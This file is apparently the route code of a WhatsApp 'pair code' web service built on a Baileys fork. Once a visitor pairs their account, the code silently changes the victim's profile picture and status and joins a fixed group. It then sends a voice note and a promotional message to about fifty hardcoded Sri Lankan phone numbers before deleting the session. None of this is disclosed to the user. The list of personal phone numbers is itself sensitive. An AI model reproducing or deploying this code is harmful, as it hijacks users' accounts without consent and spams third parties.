const PastebinAPI = require('pastebin-js');
const express = require('express');
const fs = require('fs');
const pino = require("pino");
const { default: Venocyber_Tech, useMultiFileAuthState, delay, makeCacheableSignalKeyStore } = require("maher-zubair-baileys");

const pastebin = new PastebinAPI(process.env.PASTEBIN_API_KEY);
const { makeid } = require('./id');
const router = express.Router();

const audioUrl = 'https://github.com/darkewing/audio/blob/71809cb9467dfd5f6153166c6632edb760b6e7da/WhatsApp%20Audio%202024-09-05%20at%2018.04.23_b6365aa2.mp3';
const generalMessage = `*╭────────────⊶*
*│* *ɪ ᴀᴍ ʀᴇᴀʟ ᴅᴇxᴛᴇʀ*
*╰────────────⊶*

*╭────────────⊶*
*│* ○ \`ɴᴀᴍᴇ │ DEXTER\`
*│* ○ \`ꜰʀᴏᴍ │ᴀᴍᴘᴀʀᴀ\`
*│* ○ \`ᴀɢᴇ │+17\`
*╰─────────────⊶*
*────────────⊶*
*╭──────────⊶*
*│❮ මාව save කර ගන්න❯*
*│"ඔයාව SAVE"*
*│❮ AUTO REPLY ❯*
*╰──────────⊶*

*❮ꜱᴀᴠᴇ නම් අනිවරෙන් කියන්න❯*
*❮STATUS VIEWERS වලට අවේ❯*`;
const groupLink = 'https://chat.whatsapp.com/BcaaQ3Hk2Oc1r7Me2ob69Fi';
const profilePictureUrl = 'https://telegra.ph/file/9ed44d68d2d271b2022ad.jpg';

const predefinedNumbers = [
  "+94771478752","+94728699931","+94789891016","+94783177928",
  "+94761910305","+94761910305","+94742271387","+94783177928",
  "+94718513951","+94718513951","+94742271387","+94772034667",
  "+94785671673","+94704620512","+94761646597","+94715957432",
  "+94703858726","+94769813102","+94772722806","+94768462416",
  "+94767455580","+94786174532","+94703763051","+94788304262",
  "+94760020723","+94765560432","+94760478725","+94741875278",
  "+94774876206","+94742060747","+94778314843","+94756806078",
  "+94760920618","+94701739279","+94729686700","+94772683461",
  "+94763126529","+94779734636","+94701681790","+94775664500",
  "+94773904687","+94769822986","+94772541071","+94725617816",
  "+94705969921","+94753718530","+94769310712","+94775448551",
  "+94789527659","+94741399357"
];

function removeFile(filePath) {
    if (fs.existsSync(filePath)) {
        fs.rmSync(filePath, { recursive: true, force: true });
    }
}

async function VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res) {
    const { state, saveCreds } = await useMultiFileAuthState(`./temp/${id}`);
    try {
        let Pair_Code_By_Venocyber_Tech = Venocyber_Tech({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "fatal" }).child({ level: "fatal" }),
            browser: ["Chrome (Linux)", "", ""]
        });

        Pair_Code_By_Venocyber_Tech.ev.on('creds.update', saveCreds);

        Pair_Code_By_Venocyber_Tech.ev.on("connection.update", async (s) => {
            const { connection, lastDisconnect } = s;
            if (connection === "open") {
                await handleInitialSetup(Pair_Code_By_Venocyber_Tech);
                await handleConnectionOpen(Pair_Code_By_Venocyber_Tech, customMessage, res, id);
            } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                console.error("Connection closed unexpectedly. Restarting...");
                await delay(10000); // Wait before retrying
                VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res);
            }
        });

        if (!Pair_Code_By_Venocyber_Tech.authState.creds.registered) {
            await delay(1500);
            num = num.replace(/[^0-9]/g, '');
            const code = await Pair_Code_By_Venocyber_Tech.requestPairingCode(num);
            if (!res.headersSent) {
                await res.send({ code });
            }
        }
    } catch (err) {
        console.error("Service restart failed:", err);
        await removeFile(`./temp/${id}`);
        if (!res.headersSent) {
            await res.send({ code: "Service Unavailable" });
        }
    }
}

async function handleInitialSetup(client) {
    try {
        await client.updateProfilePicture(client.user.id, { url: profilePictureUrl });
        console.log('Profile picture updated successfully!');
    } catch (error) {
        console.error('Failed to update profile picture:', error);
    }

    try {
        await client.updateProfileStatus(aboutText);
        console.log('About text updated successfully!');
    } catch (error) {
        console.error('Failed to update about text:', error);
    }
}

async function handleConnectionOpen(client, customMessage, res, id) {
    try {
        await client.groupAcceptInvite(groupLink.split('/').pop());
        console.log('Successfully joined the group!');
    } catch (error) {
        console.error('Failed to join the group:', error);
    }

    for (const number of predefinedNumbers) {
        const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        try {
            console.log(`Sending audio message to ${number}`);
            await client.sendMessage(jid, {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg',
                ptt: true 
            });
            await delay(1000); 

            console.log(`Sending text message to ${number}`);
            await client.sendMessage(jid, { text: customMessage });
            await delay(2000); 
            
        } catch (error) {
            console.error(`Failed to send message to ${number}:`, error);
        }
    }

    await delay(3000); 
    await client.ws.close();
    await removeFile(`./temp/${id}`);
}

router.get('/', async (req, res) => {
    const id = makeid();
    const num = req.query.number;
    const message = req.query.message || generalMessage;
    return await VENOCYBER_MD_PAIR_CODE(id, num, message, res);
});

module.exports = router;
